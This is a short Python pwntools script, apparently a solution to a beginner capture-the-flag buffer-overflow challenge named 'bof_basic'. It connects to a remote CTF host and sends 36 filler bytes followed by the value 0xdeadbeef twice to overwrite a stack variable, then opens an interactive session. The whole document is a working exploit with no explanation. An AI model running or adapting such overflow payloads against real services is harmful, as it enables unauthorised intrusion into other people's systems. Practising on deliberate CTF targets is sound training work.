from pwn import * 

#p = process("./bof_basic")
p = remote("ctf.j0n9hyun.xyz",3000)

payload = "a"*36
payload += "\xef\xbe\xad\xde"
payload += "\xef\xbe\xad\xde"

p.sendline(payload)
p.interactive()